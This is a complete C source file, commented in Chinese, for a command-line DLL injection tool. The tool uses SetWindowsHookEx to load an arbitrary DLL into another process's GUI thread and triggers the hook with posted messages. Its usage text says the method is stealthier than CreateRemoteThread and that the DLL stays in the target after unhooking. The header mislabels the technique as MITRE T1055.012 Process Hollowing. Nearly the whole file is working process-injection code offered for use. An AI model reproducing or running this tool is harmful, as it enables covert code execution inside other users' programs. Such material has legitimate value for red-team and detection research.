/*
 * SetWindowsHookEx Injection - 基于 Windows 钩子的 DLL 注入
 *
 * 技术原理:
 * SetWindowsHookEx 是 Windows 提供的钩子机制，允许应用程序监视和处理系统消息。
 * 当在其他进程的线程上设置钩子时，Windows 会自动将包含钩子过程的 DLL 加载到目标进程中。
 *
 * 注入流程:
 * 1. 查找目标窗口句柄
 * 2. 获取窗口的线程 ID
 * 3. 在本地加载 DLL (使用 DONT_RESOLVE_DLL_REFERENCES 避免初始化)
 * 4. 获取钩子过程的地址
 * 5. 使用 SetWindowsHookEx 在目标线程上设置钩子
 * 6. 发送消息触发钩子执行
 * 7. Windows 自动将 DLL 加载到目标进程
 *
 * 限制:
 * - 只能注入有窗口和消息循环的 GUI 进程
 * - DLL 必须导出钩子过程函数
 * - 目标进程必须处理与钩子类型匹配的消息
 *
 * MITRE ATT&CK: T1055.012 - Process Injection: Process Hollowing
 */

#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

// 钩子类型字符串
const char* GetHookTypeName(int hookType) {
    switch (hookType) {
        case WH_CALLWNDPROC:     return "WH_CALLWNDPROC";
        case WH_CALLWNDPROCRET:  return "WH_CALLWNDPROCRET";
        case WH_CBT:             return "WH_CBT";
        case WH_DEBUG:           return "WH_DEBUG";
        case WH_FOREGROUNDIDLE:  return "WH_FOREGROUNDIDLE";
        case WH_GETMESSAGE:      return "WH_GETMESSAGE";
        case WH_KEYBOARD:        return "WH_KEYBOARD";
        case WH_KEYBOARD_LL:     return "WH_KEYBOARD_LL";
        case WH_MOUSE:           return "WH_MOUSE";
        case WH_MOUSE_LL:        return "WH_MOUSE_LL";
        case WH_MSGFILTER:       return "WH_MSGFILTER";
        case WH_SHELL:           return "WH_SHELL";
        case WH_SYSMSGFILTER:    return "WH_SYSMSGFILTER";
        default:                 return "UNKNOWN";
    }
}

// 查找窗口 (支持部分匹配)
HWND FindTargetWindow(const char* windowTitle) {
    HWND hWnd = NULL;

    printf("[+] 搜索窗口: %s\n", windowTitle);

    // 尝试精确匹配
    hWnd = FindWindowA(NULL, windowTitle);
    if (hWnd != NULL) {
        printf("[+] 找到窗口 (精确匹配): 0x%p\n", hWnd);
        return hWnd;
    }

    // 如果精确匹配失败，遍历所有窗口查找部分匹配
    printf("[*] 精确匹配失败，尝试部分匹配...\n");

    // 简单实现: 使用 FindWindow 的模糊匹配
    // 注: 更复杂的实现可以使用 EnumWindows

    return NULL;
}

// 显示进程信息
void PrintProcessInfo(DWORD processId, DWORD threadId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess == NULL) {
        printf("[!] 无法打开进程 %lu: %lu\n", processId, GetLastError());
        return;
    }

    char processPath[MAX_PATH] = {0};
    DWORD size = MAX_PATH;

    if (QueryFullProcessImageNameA(hProcess, 0, processPath, &size)) {
        printf("[+] 进程路径: %s\n", processPath);
    }

    printf("[+] 进程 ID: %lu\n", processId);
    printf("[+] 线程 ID: %lu\n", threadId);

    CloseHandle(hProcess);
}

// 枚举窗口回调
typedef struct {
    const char* searchTitle;
    HWND foundWindow;
} EnumWindowData;

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    EnumWindowData* data = (EnumWindowData*)lParam;
    char windowTitle[256] = {0};

    if (GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle)) > 0) {
        // 部分匹配
        if (strstr(windowTitle, data->searchTitle) != NULL) {
            data->foundWindow = hwnd;
            printf("[+] 找到窗口 (部分匹配): %s\n", windowTitle);
            return FALSE; // 停止枚举
        }
    }

    return TRUE; // 继续枚举
}

// 查找窗口 (模糊匹配)
HWND FindWindowPartial(const char* partialTitle) {
    EnumWindowData data = {0};
    data.searchTitle = partialTitle;
    data.foundWindow = NULL;

    EnumWindows(EnumWindowsCallback, (LPARAM)&data);

    return data.foundWindow;
}

// 执行钩子注入
BOOL InjectViaHook(HWND hWnd, const char* dllPath, int hookType) {
    DWORD processId = 0;
    DWORD threadId = 0;
    HMODULE hDll = NULL;
    HOOKPROC hookProc = NULL;
    HHOOK hHook = NULL;
    BOOL success = FALSE;

    printf("\n========================================\n");
    printf("开始 SetWindowsHookEx 注入\n");
    printf("========================================\n\n");

    // 1. 获取线程 ID
    threadId = GetWindowThreadProcessId(hWnd, &processId);
    if (threadId == 0) {
        printf("[!] GetWindowThreadProcessId 失败: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] 目标窗口句柄: 0x%p\n", hWnd);
    PrintProcessInfo(processId, threadId);

    // 2. 在本地加载 DLL (不解析依赖)
    printf("\n[*] 在本地加载 DLL: %s\n", dllPath);
    hDll = LoadLibraryExA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hDll == NULL) {
        printf("[!] LoadLibraryEx 失败: %lu\n", GetLastError());
        printf("[!] 提示: 确保 DLL 路径正确且可访问\n");
        return FALSE;
    }

    printf("[+] DLL 已加载到本地进程: 0x%p\n", hDll);

    // 3. 获取钩子过程地址
    printf("[*] 查找导出函数: NextHook\n");
    hookProc = (HOOKPROC)GetProcAddress(hDll, "NextHook");
    if (hookProc == NULL) {
        printf("[!] GetProcAddress 失败: %lu\n", GetLastError());
        printf("[!] 提示: DLL 必须导出 'NextHook' 函数\n");
        FreeLibrary(hDll);
        return FALSE;
    }

    printf("[+] 钩子过程地址: 0x%p\n", hookProc);

    // 4. 设置钩子
    printf("\n[*] 在目标线程上设置钩子\n");
    printf("[*] 钩子类型: %s (%d)\n", GetHookTypeName(hookType), hookType);

    hHook = SetWindowsHookExA(hookType, hookProc, hDll, threadId);
    if (hHook == NULL) {
        printf("[!] SetWindowsHookEx 失败: %lu\n", GetLastError());
        printf("[!] 提示: 确保钩子类型与目标进程兼容\n");
        FreeLibrary(hDll);
        return FALSE;
    }

    printf("[+] 钩子已设置: 0x%p\n", hHook);
    printf("[+] ✅ DLL 已由 Windows 自动加载到目标进程!\n");

    // 5. 触发钩子
    printf("\n[*] 发送消息触发钩子执行...\n");

    // 根据钩子类型发送不同消息
    switch (hookType) {
        case WH_GETMESSAGE:
        case WH_CALLWNDPROC:
        case WH_CALLWNDPROCRET:
            // 发送 WM_NULL 消息
            if (PostThreadMessageA(threadId, WM_NULL, 0, 0)) {
                printf("[+] WM_NULL 消息已发送到线程 %lu\n", threadId);
            } else {
                printf("[!] PostThreadMessage 失败: %lu\n", GetLastError());
            }
            break;

        case WH_KEYBOARD:
            printf("[*] 提示: 请在目标窗口按任意键触发钩子\n");
            break;

        case WH_MOUSE:
            printf("[*] 提示: 请在目标窗口移动鼠标触发钩子\n");
            break;

        default:
            printf("[*] 提示: 请与目标窗口交互以触发钩子\n");
            break;
    }

    // 6. 等待用户确认
    printf("\n[*] DLL 已注入。按 Enter 卸载钩子...");
    getchar();

    // 7. 卸载钩子
    printf("\n[*] 卸载钩子...\n");
    if (UnhookWindowsHookEx(hHook)) {
        printf("[+] 钩子已卸载\n");
        success = TRUE;
    } else {
        printf("[!] UnhookWindowsHookEx 失败: %lu\n", GetLastError());
    }

    // 8. 释放本地 DLL
    FreeLibrary(hDll);
    printf("[+] 本地 DLL 已释放\n");

    printf("\n[!] 注意: DLL 仍然加载在目标进程中，直到目标进程退出\n");

    return success;
}

// 打印使用说明
void PrintUsage(const char* programName) {
    printf("SetWindowsHookEx DLL Injection\n");
    printf("基于 Windows 钩子机制的 DLL 注入工具\n\n");

    printf("用法:\n");
    printf("  %s <窗口标题> <DLL路径> [钩子类型]\n\n", programName);

    printf("参数:\n");
    printf("  窗口标题    - 目标窗口的标题 (支持部分匹配)\n");
    printf("  DLL路径     - 要注入的 DLL 的完整路径\n");
    printf("  钩子类型    - (可选) 钩子类型，默认为 WH_GETMESSAGE (3)\n\n");

    printf("钩子类型:\n");
    printf("  0  - WH_MSGFILTER       (消息过滤器)\n");
    printf("  1  - WH_JOURNALRECORD   (日志记录)\n");
    printf("  2  - WH_JOURNALPLAYBACK (日志回放)\n");
    printf("  3  - WH_GETMESSAGE      (获取消息) [默认]\n");
    printf("  4  - WH_CALLWNDPROC     (窗口过程调用)\n");
    printf("  5  - WH_CBT             (计算机辅助培训)\n");
    printf("  7  - WH_SYSMSGFILTER    (系统消息过滤器)\n");
    printf("  8  - WH_MOUSE           (鼠标)\n");
    printf("  9  - WH_HARDWARE        (硬件)\n");
    printf("  10 - WH_DEBUG           (调试)\n");
    printf("  11 - WH_SHELL           (外壳)\n");
    printf("  12 - WH_FOREGROUNDIDLE  (前台空闲)\n");
    printf("  13 - WH_CALLWNDPROCRET  (窗口过程返回)\n");
    printf("  14 - WH_KEYBOARD_LL     (低级键盘) [全局]\n");
    printf("  15 - WH_MOUSE_LL        (低级鼠标) [全局]\n\n");

    printf("示例:\n");
    printf("  %s \"记事本\" C:\\test\\hook.dll\n", programName);
    printf("  %s \"Calculator\" C:\\test\\hook.dll 3\n", programName);
    printf("  %s \"Notepad\" C:\\test\\hook.dll 2\n\n", programName);

    printf("DLL 要求:\n");
    printf("  - 必须导出 'NextHook' 函数\n");
    printf("  - 函数签名: LRESULT CALLBACK NextHook(int code, WPARAM wParam, LPARAM lParam)\n");
    printf("  - 必须调用 CallNextHookEx 传递消息链\n\n");

    printf("技术说明:\n");
    printf("  - 此方法只能注入有窗口的 GUI 进程\n");
    printf("  - Windows 会自动将 DLL 加载到目标进程\n");
    printf("  - 钩子卸载后 DLL 仍保留在目标进程中\n");
    printf("  - 与 CreateRemoteThread 相比，此方法更隐蔽\n\n");
}

// 列出所有可见窗口
void ListVisibleWindows() {
    printf("\n可见窗口列表:\n");
    printf("%-20s %-10s %s\n", "窗口句柄", "进程ID", "窗口标题");
    printf("------------------------------------------------\n");

    HWND hWnd = GetTopWindow(NULL);
    int count = 0;

    while (hWnd != NULL && count < 20) {
        if (IsWindowVisible(hWnd)) {
            char title[256] = {0};
            DWORD processId = 0;

            GetWindowTextA(hWnd, title, sizeof(title));
            GetWindowThreadProcessId(hWnd, &processId);

            if (strlen(title) > 0) {
                printf("0x%-18p %-10lu %s\n", hWnd, processId, title);
                count++;
            }
        }

        hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
    }

    printf("\n");
}

int main(int argc, char* argv[]) {
    HWND hWnd = NULL;
    char dllPath[MAX_PATH] = {0};
    int hookType = WH_GETMESSAGE; // 默认钩子类型

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║         SetWindowsHookEx DLL Injection Tool             ║\n");
    printf("║              Process Injection Technique                ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    // 检查参数
    if (argc < 3) {
        PrintUsage(argv[0]);
        ListVisibleWindows();
        return 1;
    }

    // 解析参数
    const char* windowTitle = argv[1];
    const char* dllPathArg = argv[2];

    if (argc >= 4) {
        hookType = atoi(argv[3]);
    }

    // 获取 DLL 的绝对路径
    if (GetFullPathNameA(dllPathArg, MAX_PATH, dllPath, NULL) == 0) {
        printf("[!] 无法解析 DLL 路径: %s\n", dllPathArg);
        return 1;
    }

    // 检查 DLL 是否存在
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[!] DLL 文件不存在: %s\n", dllPath);
        return 1;
    }

    // 查找目标窗口
    hWnd = FindWindowA(NULL, windowTitle);
    if (hWnd == NULL) {
        printf("[*] 精确匹配失败，尝试部分匹配...\n");
        hWnd = FindWindowPartial(windowTitle);
    }

    if (hWnd == NULL) {
        printf("[!] 未找到窗口: %s\n", windowTitle);
        printf("[*] 提示: 确保目标窗口存在且可见\n\n");
        ListVisibleWindows();
        return 1;
    }

    // 执行注入
    if (InjectViaHook(hWnd, dllPath, hookType)) {
        printf("\n[+] ✅ 注入成功完成!\n");
        return 0;
    } else {
        printf("\n[!] ❌ 注入失败!\n");
        return 1;
    }
}
